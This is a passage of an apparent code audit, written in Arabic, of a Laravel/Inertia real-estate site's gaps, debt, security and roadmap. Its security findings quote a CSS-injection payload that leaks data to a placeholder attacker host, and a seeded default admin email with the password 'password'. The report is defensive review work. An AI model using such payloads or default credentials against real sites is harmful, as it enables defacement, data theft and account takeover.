- `Components/admin/ResourceTable.tsx:34` — `new URLSearchParams(window.location.search)` **من غير أي حارس** ⇒ هيرمي فورًا تحت SSR.

الحل الصح موجود جاهز في Inertia: `usePage().url`.

#### (ي) 🟡 تفاصيل متفرقة

- **تبديل اللغة بيعمل full page reload:** `SiteLayout.tsx:127` → `onClick={() => (window.location.href = switchUrl())}`. المفروض `<a href>` عشان الكرولر يقدر يتبع اللينك (وده كمان جزء من مشكلة الـ hreflang).
- **`dangerouslySetInnerHTML` على labels الباجينيشن:** `ResourceTable.tsx:105` و `:108`. المحتوى جاي من Laravel (`&laquo;`) فالخطر منخفض، بس النمط مش محتاج (تقدر تعمل decode بسيط).
- **تعليق بيكدب على الكود:** `ResourceTable.tsx:7-9` بيقول "البحث والفرز والباجينيشن كلها query params" — **الفرز مش منفّذ إطلاقًا**: مفيش UI للفرز، و`ResourceController::index` بيقرا `q` بس (`app/Support/ResourceController.php:82`).
- **صفحة الداشبورد فيها معلومات قديمة:** `Pages/Admin/Dashboard.tsx:13-18` بتعرض "المرحلة 4 — العقارات والكمبوندات… `done: false`" مع إن المرحلة 4 اتشحنت فعلًا في كوميت `35c00b8`. وكمان الداشبورد **مفهوش أي رقم حقيقي** — لا عدد ليدز، لا عدد عقارات (`Modules/Core/app/Http/Controllers/DashboardController.php:11-14` بيرندر بدون props).
- **مجموعتا إعدادات مقطوعتين عن المنيو:** `SettingsController::GROUPS` فيه 7 مجموعات (`:16-24`) بينما `AdminLayout.tsx:22-28` بيعرض 5 بس. `/admin/settings/seo` و `/admin/settings/integrations` (فيها GTM و Meta Pixel و Google Place ID) **مفيش منها أي لينك في الواجهة** — وصولها بكتابة الـ URL يدوي بس. (التبويبات جوه شاشة الإعدادات `Settings/Edit.tsx:34-44` بتعرض السبعة — فالمستخدم لازم يدخل الإعدادات الأول عشان يشوفهم.)
- **`remember` دايمًا مفعّل:** `Pages/Admin/Login.tsx:8` → `remember: true` hardcoded من غير checkbox في الواجهة.
- **`resources/views/welcome.blade.php`** (277 سطر) — صفحة Laravel الافتراضية، ملف ميت مفيش راوت بيوصله.

---

## 5. الفجوات الحرجة (Critical Gaps)

مرتّبة بالخطورة على قابلية الإطلاق.

### 🔴 CG-1 — البحث والفلترة غير موجودين

- **الأثر:** الوظيفة الأساسية لموقع عقاري مفقودة. الفورمين بيرجّعوا نفس الصفحة. ومستحيل تنفيذ فلترة سعرية أصلًا لأن `price` مخزّن `string` (`Modules/Properties/database/migrations/2026_02_01_000004_create_properties_table.php:19-20`) و `starting_price` كذلك (`…create_compounds_table.php:19`).
- **الإصلاح:** (1) migration يضيف `price_amount` (`unsignedBigInteger` nullable) + `currency` + index مركّب `(is_active, purpose, location_id, price_amount)`؛ (2) `PropertyFilter`/query object يقرا `q, purpose, type, location, min_price, max_price, beds, sort`؛ (3) الراوت يستقبل `Request` ويمرّر الفلاتر لـ `Catalog::properties()`؛ (4) الفرونت يستخدم `router.get` مع `preserveState` عشان الفلاتر تفضل في الـ URL (shareable).
- **الجهد:** **6–10 أيام**.

### 🔴 CG-2 — صفر صفحات تفصيلية (`/properties/{slug}`, `/compounds/{slug}`)

- **الأثر:** الموقع كله ليستنجات. كل CTA بيروح لواتساب أو لصفحة الليستنج نفسها (`Components/site/CompoundCard.tsx:56` → `/${locale}/compounds`). مفيش صفحة تتفهرس، مفيش صفحة تتشير، مفيش صفحة تتعمل عليها إعلانات. `route:list` مفيهوش أي راوت `show` للعقارات أو الكمبوندات.
- **الإصلاح:** إضافة `slug` unique للجدولين + راوتات `show` + صفحتين React (gallery، مواصفات، حاسبة تقسيط، خريطة، عقارات مشابهة، JSON-LD).
- **الجهد:** **10–16 يوم**.

### 🔴 CG-3 — صفر SEO (مفيش `<Head>` ولا sitemap ولا hreflang ولا structured data)

- **الأثر:** حاجب إطلاق لموقع عضوي. كل الصفحات بنفس العنوان (`resources/views/app.blade.php:14`). موديول `Seo` stub خام 27 ملف متولّد.
- **الإصلاح:** كومبوننت `<Seo>` موحّد بيستخدم `<Head>` من Inertia + جدول `seo_meta` polymorphic + `sitemap.xml` مولّد + `hreflang` لكل صفحة + JSON-LD.
- **الجهد:** **8–14 يوم**.

### 🔴 CG-4 — مفيش رفع ملفات (Media Manager) نهائيًا

- **الأثر:** الأدمن **مش قادر يرفع صورة عقار.** حقل `image` في الفورم = خانة نص لمسار:
  ```tsx
  // engine/resources/js/Pages/Admin/Resource/Form.tsx:110-118
  if (f.type === "image") { return (<div ...><Input value={String(value ?? "")} placeholder="/images/demo/..." dir="ltr" /> ... }
  ```
  ومفيش أي معالجة رفع في الباك إند: grep على `UploadedFile|->file(|Storage::` في `app/` و `Modules/` بيرجّع **صفر نتائج**.
  والأسوأ: `spatie/laravel-medialibrary ^11.23` **متثبّتة** (`engine/composer.json:17`) وجدول `media` موجود ومهاجَر (`database/migrations/2026_08_16_154840_create_media_table.php`, **0 صفوف**) و**مش مستخدمة في أي سطر** (grep على `InteractsWithMedia|HasMedia` = صفر). نفس الحكاية مع `spatie/laravel-translatable ^6.14` — متثبّتة ومش مستخدمة (الترجمة اتعملت يدوي بـ trait `Bilingual`).
- **الإصلاح:** تفعيل medialibrary على `Property`/`Compound`/`Post`/`Location` + endpoint رفع بـ validation (`mimes`, `max`, `dimensions`) + conversions (thumb/webp) + Media picker في `Resource/Form.tsx`.
- **الجهد:** **7–12 يوم**.

### 🟠 CG-5 — 40 راوت API ميت (guard مش موجود)

- **الأثر:** `php artisan route:list` بيطلع **121 راوت**، منهم **40 راوت** تحت `api/v1/*` معرّفين بـ:
  ```php
  // engine/Modules/Core/routes/api.php:6 (ونفس السطر في 7 موديولات تانية)
  Route::middleware(['auth:sanctum'])->prefix('v1')->group(...);
  ```
  لكن `laravel/sanctum` **مش متثبّتة** (`vendor/laravel/` فيه framework, pail, pint, prompts, sail, serializable-closure, tinker — مفيش sanctum) و `config/auth.php:40-45` فيه guard `web` بس. **أي طلب على أي راوت API = exception فورًا.** والكنترولرات اللي وراهم stubs فاضية أصلًا (`Modules/Properties/app/Http/Controllers/PropertiesController.php:29` → `public function store(Request $request) {}`).
  وكمان 21 راوت stub تاني (`/pages`, `/reviews`, `/seos`) بيرندروا "Hello World" (`Modules/Pages/resources/views/index.blade.php:2`).
- **الإصلاح:** إما حذف ملفات `api.php` والراوتات الـ stub (نص ساعة)، أو تثبيت sanctum وبناء API حقيقي.
- **الجهد:** **0.5 يوم** (تنضيف) أو **6–10 أيام** (API حقيقي).

### 🟠 CG-6 — انفصال `overlay/` عن `engine/` (الـ scaffold بقى بايظ)

- **الأثر:** **`./setup.sh` مش بيعيد إنتاج `engine/`.** الجرد الفعلي:
  - **16 ملف** في `overlay/` مختلف عن نظيره في `engine/`، منهم فروق ضخمة: `resources/js/Pages/Site/Home.tsx` (297 → 387 سطر، 474 سطر مختلف)، `Contact.tsx` (111 → 350)، `SiteLayout.tsx` (159 → 269)، `app/Support/DemoContent.php` (36 → 310)، `routes/web.php` (35 → 64).
  - **20+ ملف مكتوب بإيد** موجود في `engine/` ومش موجود في `overlay/` خالص: `app/Support/Catalog.php`, `app/Support/ResourceController.php`, `app/Support/Bilingual.php`, `Components/site/{HeroSearch,FrameMedia,PageHero,SocialIcons}.tsx`, `Pages/Site/{Blog,Post}.tsx`, `Pages/Admin/Resource/{Index,Form}.tsx`, `database/seeders/{CatalogSeeder,BlogSeeder,LeadSeeder}.php`، **وكل كود المرحلة 4** (موديلات + migrations + admin controllers لـ Locations/Developers/Compounds/Properties/Leads/Blog).
  - `overlay/routes/web.php:16-17` لسه بيقرا من `DemoContent` مباشرة، و`:28-30` صفحات About/Contact من غير props، ومفيش راوت `/blog` أصلًا.
  - `overlay/Modules/Core/routes/web.php` ناقصه 6 راوتات إدارة المستخدمين الموجودة في `engine`.
- **يعني عمليًا:** تشغيل `setup.sh` النهارده بيطلّع نسخة **v1.2 قديمة** (فيها WebGL hero و DemoContent بس)، مش النسخة الشغالة. الوعد الأساسي للريبو ("scaffold بيولّد المشروع") **مكسور**.
- **الإصلاح:** إما مزامنة `overlay/` من `engine/` كخطوة release مؤتمتة (سكريبت `sync-overlay.sh` بيعمل rsync للملفات المكتوبة بإيد)، أو إعلان `engine/` هو المصدر الوحيد للحقيقة وتحويل `setup.sh` لـ `git clone` + `composer install`.
- **الجهد:** **2–4 أيام**.

### 🟠 CG-7 — نظام الأدوار مقطوع (`editor` و `agent` بيتعملوا ومبيفتحوش حاجة)

- **الأثر:** `AdminUserSeeder.php:13` بينشئ 3 أدوار، و`UserAdminController::ROLES` (`:18-22`) بيدّي الأدمن يختار بينهم. لكن **كل** راوتات الأدمن محمية بـ `role:admin` (`Modules/Core/routes/web.php:25` + نفس السطر في 6 موديولات). يعني مستخدم `editor` بيسجّل دخول بنجاح وبياخد **403 على كل شاشة** — بما فيها الداشبورد. وجدول `permissions` فيه **0 صفوف** و `role_has_permissions` فيه **0 صفوف**؛ grep على `can(|permission:|Gate::|authorize(` في `app/` و `Modules/` و `resources/js` = **صفر نتائج**. `spatie/laravel-permission` مستخدمة كـ role-flag واحد بس.
- **الإصلاح:** تعريف permissions لكل ريسورس، seeder بيربطها بالأدوار، استبدال `role:admin` بـ `permission:*`، إخفاء عناصر المنيو حسب الصلاحية، وشاشة إدارة أدوار.
- **الجهد:** **4–7 أيام**.

### 🟠 CG-8 — كل المحتوى مُختلَق (خطر قانوني/سمعة عند النشر)

- **الأثر:** الموقع لو اتنشر زي ما هو بيدّعي وقائع كاذبة عن الشركة:
  - `Pages/Site/About.tsx:21-26` → "4780 عميل أتمّ التعاقد"، "46 فرد في الفريق"، "420 كمبوند شريك"، "3 فروع في مصر".
  - `Pages/Site/About.tsx:11-12` → "اثنتا عشرة سنة في سوق واحد… بدأنا مكتب تسويق صغير في التجمع الخامس سنة 2014".
  - `Pages/Site/About.tsx:15-20` → تعهّدات ملموسة ("مستشارينا مبياخدوش عمولة مربوطة بوحدة بعينها"، "فريق ما بعد البيع بيتابع الأقساط").
  - `app/Support/DemoContent.php:262-274` → أعضاء فريق بأسماء وصور (`/images/demo/team-1..4.jpg` = صور ستوك من Unsplash).
  - `Pages/Site/Home.tsx:19` → "إطلاق جديد · 6 كمبوندات في العاصمة الإدارية" و `:25-33` → "1240 وحدة متاحة"، "38 كمبوند مسجّل"، و`:31` → "متوسط سعر المتر · التجمع = EGP 34,500".
  - أسماء المشاريع في `DemoContent.php` خيالية (بإقرار التعليق في `:5-8`) والأكواد `XH-1001…` (بادئة "X Homes" من الكانفاس الأصلي، مالهاش علاقة بالبراند).
- **الإصلاح:** كل الأرقام والنصوص التسويقية تتنقل لجداول محتوى قابلة للتحرير من الداشبورد (موديول `Pages`)، مع قيم افتراضية فاضية بدل مخترعة، وحذف صور الفريق الستوك.
- **الجهد:** **5–9 أيام** (بعد بناء `Pages`).

### 🟠 CG-9 — صفر تغطية اختبارات، والاختبار الوحيد بيفشل

- **الأثر:** `php artisan test` النهارده:
  ```
  FAIL  Tests\Feature\ExampleTest
  ⨯ the application returns a successful response
  Expected response status code [200] but received 302.
  Tests: 1 failed, 1 passed (2 assertions)
  ```
  السبب: `tests/Feature/ExampleTest.php:15-17` بيتوقّع `GET /` = 200، لكن `routes/web.php:7` بيعمل `Route::redirect('/', '/ar')` = 302. الاختبار الوحيد الموجود من ساعة الـ scaffold وماحدش شغّله.
  وكمان `phpunit.xml:7-14` بيسجّل `tests/Unit` و `tests/Feature` بس — **مجلدات تستات الموديولات مش مضمّنة أصلًا**، و`<source><include>` فيه `app` بس (`:15-19`) يعني `Modules/` خارج قياس التغطية.
  و 20 مجلد تستات في الموديولات كلها فاضية (`.gitkeep` بس).
- **الإصلاح:** إصلاح التست الفاشل، إضافة `Modules/*/tests` للـ testsuites، وكتابة Feature tests للمسارات الحرجة (auth, settings save + cache flush, lead store + validation, resource CRUD × 7, locale routing, theme injection) + Playwright E2E.
- **الجهد:** **8–14 يوم** للوصول لتغطية معقولة (~60% على المسارات الحرجة).

### 🟡 CG-10 — مفيش DevOps ولا إعداد إنتاج

- **الأثر:** مفيش `.github/` (لا CI لا CD) · مفيش `Dockerfile` ولا `docker-compose.yml` · مفيش `.env.production` · قاعدة البيانات SQLite في `database/database.sqlite` · `engine/.env.example:4` فيه `APP_DEBUG=true` (يعني أول deploy بيطلع stack traces للناس) · و`engine/.env` الفعلي **لسه القالب الافتراضي**: `APP_NAME=Laravel`، `APP_URL=http://localhost` (يعني أي رابط مطلق أو sitemap أو إيميل هيطلع غلط) · مفيش `SESSION_SECURE_COOKIE` ولا `queue worker` supervisor config مع إن `QUEUE_CONNECTION=database`.
- **الإصلاح:** GitHub Actions (pint + tsc + phpunit + build) · `.env.production.example` بـ `APP_DEBUG=false`, `SESSION_SECURE_COOKIE=true`, MySQL · Dockerfile متعدد المراحل أو deploy script · نقل الميديا لـ S3/CDN.
- **الجهد:** **4–7 أيام**.

---

## 6. الديون التقنية (Technical Debt)

مرتّبة بالتكلفة المستقبلية.

| # | الدين | الدليل | تكلفة التأجيل |
|---|---|---|---|
| **TD-1** | **`price` نصّي** في العقارات والكمبوندات | `…create_properties_table.php:19-20` (`price`, `price_en` كلاهما `string`) · `…create_compounds_table.php:19` (`starting_price` string) | كل يوم داتا جديد بيتدخل بيزوّد تكلفة الـ migration. مستحيل فلترة/ترتيب/إحصاء بالسعر. **الأعلى تكلفة على الإطلاق.** |
| **TD-2** | **الـ modularity وهمية** — تبعية متبادلة root ↔ modules | `app/Support/Catalog.php:5-8` بيستورد 4 موديلات من 4 موديولات · كل `*AdminController` بيرث `App\Support\ResourceController` | تعطيل أي موديول = fatal. مفيش قابلية إعادة استخدام حقيقية عبر مشاريع. |
| **TD-3** | **صفر indexes على أعمدة الاستعلام** | كل استعلامات الموقع `where('is_active', true)->orderBy('sort')` (`Catalog.php:19-22, 37-40, 56-60`) لكن `locations`, `developers`, `compounds`, `properties`, `posts` **مفيهاش أي `->index()`**. الـ index الوحيد المضاف يدويًا في المشروع كله هو `$table->index('status')` في `…create_leads_table.php:26` | full table scan على كل تحميل صفحة. غير محسوس على 9 عقارات، كارثي على 5,000. |
| **TD-4** | **مفيش pagination في الموقع العام** | `Catalog::properties($locale)` من غير `$limit` في `routes/web.php:23` بيرجّع **كل** العقارات المفعّلة في payload الـ Inertia، والفلترة client-side في `Pages/Site/Properties.tsx:49-51` | حجم الـ payload خطّي مع حجم الكتالوج. عند 2,000 عقار = صفحة بميجابايتات. |
| **TD-5** | **over-fetch في شاشات الأدمن** | `PropertyAdminController::options()` (`:62-67`) و `CompoundAdminController::options()` (`:56-61`) بيتنفّذوا جوه `fields()` اللي `schema()` بينادي عليها في **كل** أكشن — يعني `/admin/properties` (الليستنج) بيحمّل كل المناطق وكل الكمبوندات من غير أي داعي | استعلامين زيادة + payload منتفخ على كل تحميل صفحة أدمن. |
| **TD-6** | **مفيش code-splitting** | `resources/js/app.tsx:7` → `import.meta.glob("./Pages/**/*.tsx", { eager: true })` · ناتج `npm run build` الفعلي: **`app-DoTtseky.js` = 496.18 kB (156.11 kB gzip)** في chunk **واحد** + `app-DEUA_Uc5.css` = 61.94 kB | زائر بيدخل `/ar` بيحمّل كود الأدمن كله. وكل ملف React جديد بيكبّر البندل لكل زائر. |
| **TD-7** | **حزمتان ثقيلتان متثبّتتان ومش مستخدمتين** | `spatie/laravel-medialibrary ^11.23` و `spatie/laravel-translatable ^6.14` في `composer.json:17-19` — grep على `InteractsWithMedia|HasMedia|HasTranslations` = صفر. جدول `media` مهاجَر و 0 صفوف | وزن vendor + تحديثات أمنية على كود ميت + تشويش على المطور الجديد. |
| **TD-8** | **الوثائق بتوصف نسخة مش موجودة** | `README.md` v1.2 بيوصف "هيرو WebGL حي… تشغيل/إيقاف من الداشبورد: `hero_variant`" — الكومبوننت مش مستورد والمفتاح مش مقروء (شوف §4.2ب) · `Pages/Admin/Dashboard.tsx:13-18` بيعرض المرحلة 4 كـ "لم تكتمل" وهي مشحونة · `Components/admin/ResourceTable.tsx:8` بيدّعي فرز غير منفّذ | كل مطور جديد هيضيّع وقت يدوّر على features مش موجودة. |
| **TD-9** | **ازدواج/تعارض في ميدل وير الموديولات** | `RouteServiceProvider::mapWebRoutes` (`Modules/*/app/Providers/RouteServiceProvider.php:38`) بيلف الملف في `Route::middleware('web')`، وبعدين 6 من ملفات `routes/web.php` بتضيف `'web'` تاني (`Modules/Blog/routes/web.php:13`, `Compounds:13`, `Developers:13`, `Leads:13`, `Locations:13`, `Properties:13`) بينما `Modules/Core/routes/web.php:16` **مش** بيضيفها | تكرار وعدم اتساق — أي واحد بيقرا الملف مش هيعرف الحقيقة فين. |
| **TD-10** | **كنترولرات ومسارات stub ميتة** | `Modules/Core/…/CoreController.php` (56 سطر stub) · `PagesController`, `ReviewsController`, `SeoController`, `LocationsController`, `DevelopersController`, `CompoundsController`, `PropertiesController` (كلها stubs) · `resources/views/welcome.blade.php` (277 سطر) · 8 ملفات `Modules/*/vite.config.js` و `resources/assets/{js,sass}` مش مستخدمة | 61 راوت من الـ 121 (50%) ميتة أو stub. `route:list` بقى غير قابل للقراءة. |
| **TD-11** | **`DemoContent` بيتسرّب في الإنتاج** | `Catalog::properties/compounds/areas` بترجع `DemoContent` لو الجدول فاضي (`Catalog.php:26-30, 44-48, 63-67`) · وصفحتا About/Contact **بتاخد كل بياناتها** من `DemoContent` مباشرة (`routes/web.php:31-32, 36`) من غير أي fallback لجدول | موقع عميل حقيقي ممكن يعرض مشاريع خيالية لو حد نسي يعمل seed أو الداتا اتمسحت. |

---

## 7. الأمان — نتائج محددة

مرتّبة بالخطورة. كل نتيجة مربوطة بسطر.

### 🔴 S-1 — مفيش rate limiting على تسجيل الدخول (brute force)

```php
// engine/Modules/Core/routes/web.php:19-22
Route::middleware('guest')->group(function () {
    Route::get('login',  [AuthController::class, 'create'])->name('login');
    Route::post('login', [AuthController::class, 'store'])->name('login.store');   // ⚠ مفيش throttle
});
```
و`AuthController::store` (`:20-36`) بيعمل `Auth::attempt` مباشرة من غير أي `RateLimiter` ولا `LoginRequest` ولا lockout. **المهاجم يقدر يجرّب كلمات مرور بلا حدود.**
**الإصلاح:** `->middleware('throttle:5,1')` كحد أدنى فورًا، والأفضل `RateLimiter::for('login')` بمفتاح `email|ip` + Fortify لاحقًا. **الجهد: 0.5 يوم.**

### 🔴 S-2 — بيانات مدير افتراضية معروفة ومنشورة

```php
// engine/Modules/Core/database/seeders/AdminUserSeeder.php:17-25
$admin = User::updateOrCreate(
    ['email' => 'admin@bp-eg.com'],
    ['name' => 'Amr Shalaby', 'password' => 'password']   // ⚠
);
```
والبيانات مكتوبة صراحة في `README.md` و `setup.sh:77`. `updateOrCreate` معناها إن **إعادة تشغيل الـ seeder بترجّع كلمة المرور لـ `password`** حتى لو الأدمن غيّرها. مع S-1 (مفيش throttle) ده اختراق مباشر لأي نشرة عامة.
**الإصلاح:** توليد كلمة مرور عشوائية وطباعتها مرة واحدة في الترمينال، أو قراءتها من `env('ADMIN_PASSWORD')` مع فشل واضح لو مش متحطة؛ واستخدام `firstOrCreate` بدل `updateOrCreate` للباسورد. **الجهد: 0.5 يوم.**

### 🟠 S-3 — endpoint عام لاستقبال بيانات شخصية بدون أي حماية من الإساءة

```php
// engine/routes/web.php:60-61
Route::post('/leads', [\Modules\Leads\Http\Controllers\LeadController::class, 'store'])->name('leads.store');
```
`LeadController::store` (`:16-37`) فيه validation كويس للأنواع (`:18-26`) و allow-list للـ `source` (`:28-30`) — **بس مفيش `throttle`، مفيش honeypot، مفيش captcha، مفيش فحص تكرار.** الجدول بيخزّن اسم + تليفون + إيميل + رسالة (PII).
**الأثر:** إغراق الجدول بسبام، وتلويث بيانات المبيعات، واحتمال استهلاك موارد.
**الإصلاح:** `throttle:5,10` + حقل honeypot مخفي + فحص `phone` بصيغة مصرية + `unique` ناعم على (phone, created_at خلال ساعة). **الجهد: 1 يوم.**

### 🟠 S-4 — CSS injection عبر إعدادات الثيم

```blade
{{-- engine/resources/views/app.blade.php:22-28 --}}
<style>
    :root {
    @foreach ($theme as $key => $value)
        --{{ str_replace('_', '-', $key) }}: {{ $value }};
    @endforeach
    }
</style>
```
والقيم بتتحقّق كنص حر بس:
```php
// engine/Modules/Core/app/Http/Controllers/SettingsController.php:101-104
$data = $request->validate([
    'values'   => ['required', 'array'],
    'values.*' => ['nullable', 'string', 'max:2000'],   // ⚠ مفيش فحص hex/طول/صيغة
]);
```
Blade بيعمل HTML-escape فالخروج بـ `</style>` محجوب، **لكن الخروج من التصريح CSS مفتوح**: قيمة زي `red; } html { background: url(https://attacker/?leak=` بتحقن قواعد CSS كاملة (تشويه، تسريب عبر طلبات خارجية، إخفاء عناصر).
- **الخطورة مخفّفة:** الاستغلال محصور في مستخدم بدور `admin` (`Modules/Core/routes/web.php:25`).
- **الإصلاح:** `regex:/^#[0-9A-Fa-f]{3,8}$/` للمفاتيح اللونية، allow-list للمفاتيح المسموح حقنها في `<style>`، و`max:64` للقيم اللونية. **الجهد: 0.5 يوم.**

### 🟠 S-5 — مفيش `exists` validation على أي مفتاح أجنبي

`ResourceController::validated()` بيولّد القواعد من نوع الحقل بس:
```php
// engine/app/Support/ResourceController.php:210-215
$rule[] = match ($f['type'] ?? 'text') {
    'number' => 'integer',
    'toggle' => 'boolean',
    'date'   => 'date',
    default  => 'string',       // ⚠ select ⇒ string
};
```
يعني `location_id` و `compound_id` (`Modules/Properties/app/Http/Controllers/PropertyAdminController.php:41-42`) و `developer_id` (`CompoundAdminController.php:40-41`) بيتحقّقوا كـ **نصوص** من غير `exists:locations,id`. أدمن (أو طلب مصنوع) يقدر يبعت `location_id=99999`؛ على MySQL بـ FK constraints ده بيرمي 500، وعلى SQLite بدون تفعيل FK ممكن يعدّي ويسيب داتا معطوبة.
كمان `sort` معرّف `number` ⇒ `integer` بس، والعمود `unsignedInteger` — قيمة سالبة = خطأ قاعدة بيانات مش خطأ validation.
**الإصلاح:** إضافة `'exists'` و `'in'` كخصائص في تعريف الحقل، وتوليد `exists:{table},id` تلقائيًا لأي حقل بينتهي بـ `_id`، و`min:0` للأرقام غير السالبة. **الجهد: 1–2 يوم.**

### 🟡 S-6 — مفيش authorization layer (اعتماد كامل على ميدل وير الراوت)

`ResourceController` مفهوش أي `authorize()` ولا Policy — الحماية كلها من `role:admin` على مستوى الراوت. grep على `Gate::|authorize(|can(|permission:` في `app/` و `Modules/` و `resources/js` = **صفر نتائج**. جدول `permissions` = 0 صفوف.
النتيجة: مفيش صلاحيات على مستوى الصف (agent يشوف الليدز بتاعته بس)، ومفيش صلاحيات لكل أكشن. أي مستخدم `admin` يقدر يعمل أي حاجة. (شوف كمان CG-7.)
**الإصلاح:** Policies لكل موديل + `$this->authorize()` جوه `ResourceController`. **الجهد: 3–5 أيام.**

### 🟡 S-7 — إعدادات إنتاج غير آمنة كـ default

- `engine/.env.example:4` → `APP_DEBUG=true` (القالب المشحون).
- `engine/.env` الفعلي لسه القالب الافتراضي: `APP_NAME=Laravel`، `APP_URL=http://localhost` — يعني ماحدش وصله بـ `.env.example` بتاع المشروع.
- مفيش `SESSION_SECURE_COOKIE` في `.env.example` (`config/session.php:172` بيقرا `env('SESSION_SECURE_COOKIE')` = null ⇒ الكوكي مش `Secure`).
- `SESSION_ENCRYPT=false` (`.env.example`, `config/session.php:50`).
- مفيش أي security headers (CSP، HSTS، `X-Frame-Options`) — لا في ميدل وير ولا في `public/.htaccess`.
- **إيجابي:** `engine/.gitignore:3` فيه `.env` و `git ls-files` بيأكد إن `.env` **مش متتبَّع** (المتتبَّع هو `.env.example` بس). ✅
- **إيجابي:** `database/*.sqlite` مستبعدة (`engine/.gitignore:27-30`). ✅

### 🟡 S-8 — نقاط أصغر

- **`dangerouslySetInnerHTML`** على labels الباجينيشن (`Components/admin/ResourceTable.tsx:105, 108`). المصدر Laravel نفسه فالخطر منخفض جدًا، بس النمط غير مبرّر.
- **`remember` دايمًا `true`** (`Pages/Admin/Login.tsx:8`) — كوكي طويل الأجل إجباري بدون اختيار المستخدم.
- **CSRF سليم:** `HandleInertiaRequests` جوه مجموعة `web` (`bootstrap/app.php:15-17`)، وكل فورمات الأدمن بتستخدم `useForm`/`router` من Inertia اللي بيبعت `X-XSRF-TOKEN`. مفيش أي `VerifyCsrfToken::$except`. ✅
- **Mass assignment سليم:** كل الموديلات معرّفة `$fillable` صراحةً (`Property.php:15-18`, `Compound.php:15-19`, `Location.php:14`, `Developer.php:12`, `Lead.php:9-11`, `Post.php:14-17`, `Setting.php:11`, `User.php:14-18`)، مفيش `$guarded = []` في أي مكان. و`ResourceController::store/update` بيمرّروا بيانات **مفلترة بالفعل** من `validated()` (`:127, :140`). ✅
- **تخزين كلمات المرور سليم:** cast `'password' => 'hashed'` (`app/Models/User.php:29`)، والهاش مش بيتبعت للمتصفح أبدًا (`UserAdminController::itemPayload:141-143` بيبعت `''`). ✅
- **منطق حماية آخر مدير محكم:** `UserAdminController::isLastAdmin` (`:147-156`) + `guardDelete` (`:106-117`) بيمنعوا حذف نفسك وحذف آخر مدير، ومطبّقين في الـ validation كمان (`:73-77`). ✅

---

## 8. خارطة الطريق المقترحة

الـ README الحالي بيعرض مراحل 2→5. الترقيم ده **اتخطّى على أرض الواقع**: المرحلة 4 (العقارات/الكمبوندات/المطوّرون/المناطق) اتشحنت في كوميت `35c00b8` قبل المرحلة 2 (Media Manager) والمرحلة 3 (Block Builder). الخريطة دي بتصحّح الترتيب على أساس **ما هو حاجب للإطلاق فعلًا**، مع الحفاظ على أسماء المراحل الأصلية عشان الاستمرارية.

---

### المرحلة 2 (مصحّحة) — «تثبيت الأساس» · 12–20 يوم

الهدف: نوقف النزيف قبل أي feature جديدة.

| البند | مرجع | الجهد |
|---|---|---|
| throttle على `/admin/login` وعلى `/leads` + honeypot | S-1, S-3 | 1–1.5 يوم |
| إزالة الباسورد الافتراضي المكتوب في الكود | S-2 | 0.5 يوم |
| فحص hex للألوان + allow-list لمفاتيح الثيم | S-4 | 0.5 يوم |
| `exists`/`min` في مولّد قواعد `ResourceController` | S-5 | 1–2 يوم |
| **Media Manager** (تفعيل medialibrary + رفع + conversions + picker) | CG-4 | 7–12 يوم |
| حذف 40 راوت API الميت + 21 راوت stub + الكنترولرات الميتة + `welcome.blade.php` | CG-5, TD-10 | 0.5 يوم |
| إصلاح التست الفاشل + إضافة `Modules/*/tests` لـ `phpunit.xml` + 10 Feature tests للمسارات الحرجة | CG-9 | 3–5 أيام |
| CI على GitHub Actions (pint + `tsc --noEmit` + phpunit + `npm run build`) | CG-10 | 1–2 يوم |
| مزامنة `overlay/` ↔ `engine/` أو إعلان `engine/` مصدر الحقيقة | CG-6 | 2–4 أيام |

---

### المرحلة 3 (مصحّحة) — «الموقع يبقى موقع» · 20–32 يوم

الهدف: تحويل الـ template لموقع عقاري فعلي. **دي أهم مرحلة.**

| البند | مرجع | الجهد |
|---|---|---|
| migration: `price_amount` رقمي + `slug` + indexes مركّبة على العقارات/الكمبوندات/المناطق | TD-1, TD-3 | 2–3 أيام |
| **بحث وفلترة server-side حقيقية** (query object + URL state + pagination) | CG-1, TD-4 | 6–10 أيام |
| **صفحة تفاصيل عقار** (gallery, مواصفات, حاسبة تقسيط, عقارات مشابهة, CTA) | CG-2 | 6–9 أيام |
| **صفحة تفاصيل كمبوند** (master plan, أنواع الوحدات, المطوّر, الموقع) | CG-2 | 4–7 أيام |
| صفحات المطوّر والمنطقة العامة | CG-2 | 2–3 أيام |
| code-splitting (`eager: false` + `lazy`) وتقليل البندل | TD-6 | 1–2 يوم |

---

### المرحلة 4 (مصحّحة) — «السيو والمحتوى» · 16–26 يوم

الهدف: الموقع يتفهرس ويتحرّر بالكامل من الداشبورد.

| البند | مرجع | الجهد |
|---|---|---|
| كومبوننت `<Seo>` + `<Head>` لكل صفحة + canonical + hreflang + OG | CG-3 | 4–6 أيام |
| JSON-LD (`RealEstateListing`, `Organization`, `BreadcrumbList`, `FAQPage`) | CG-3 | 2–3 أيام |
| `sitemap.xml` مولّد + `robots.txt` ديناميكي + موديول `Seo` (جدول `seo_meta`) | CG-3 | 3–5 أيام |
| تفعيل SSR فعليًا (`--ssr` build + `inertia:start-ssr` + إصلاح `window` وقت الرندر) | §2.3, §4.2ط | 2–4 أيام |
| نظام i18n حقيقي (ملفات lang + hook `t()` + ترحيل الـ `copy` objects) | §4.2د | 3–5 أيام |
| موديول `Pages` — محتوى About/Contact/الأرقام قابل للتحرير + إزالة كل الأرقام المُختلَقة | CG-8 | 5–9 أيام |

---

### المرحلة 5 (مصحّحة) — «التشغيل والجاهزية» · 14–24 يوم

| البند | مرجع | الجهد |
|---|---|---|
| نظام صلاحيات كامل (permissions + policies + `authorize()` + UI للأدوار) | CG-7, S-6 | 5–8 أيام |
| Leads: إشعارات (إيميل/واتساب)، assignment، تصدير CSV، لوحة قمع مبيعات | §3 | 4–6 أيام |
| KPIs حقيقية في داشبورد الأدمن + إزالة قائمة المراحل القديمة | §4.2ي | 1–2 يوم |
| Activity Log على كل تعديل أدمن | §3 Core | 2–3 أيام |
| ضبط الإنتاج (`.env.production`, MySQL, `APP_DEBUG=false`, secure cookies, security headers, S3/CDN للميديا, supervisor للطابور) | CG-10, S-7 | 3–5 أيام |

---

### المرحلة 6 — «التلميع» · 12–20 يوم

| البند | مرجع | الجهد |
|---|---|---|
| **إعادة كتابة WebGL hero** بشادر متعلّق بالدومين (skyline/شبكة معمارية/particles للمدينة) + إعادة ربطه بـ `hero_variant` + فحص `COMPILE_STATUS` + cleanup كامل للـ GL context | §4.2ب | 4–7 أيام |
| تدقيق a11y كامل (h1 واحد، aria-live، تبويبات، skip link، لوحة مفاتيح) | §4.2ح | 3–5 أيام |
